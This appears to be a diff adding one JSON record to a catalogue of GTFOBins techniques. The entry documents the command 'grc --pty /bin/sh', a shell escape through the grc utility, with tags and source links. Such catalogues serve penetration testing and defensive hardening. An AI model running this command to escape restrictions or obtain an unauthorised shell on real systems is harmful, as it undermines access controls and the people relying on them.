@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-grc-shell",
+  "name": "GTFOBins · grc (shell)",
+  "command": "grc --pty /bin/sh",
+  "description": "Use grc to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "grc",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/grc/#shell",
+  "upstream_id": "grc/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/grc/"
+    }
+  ]
+}
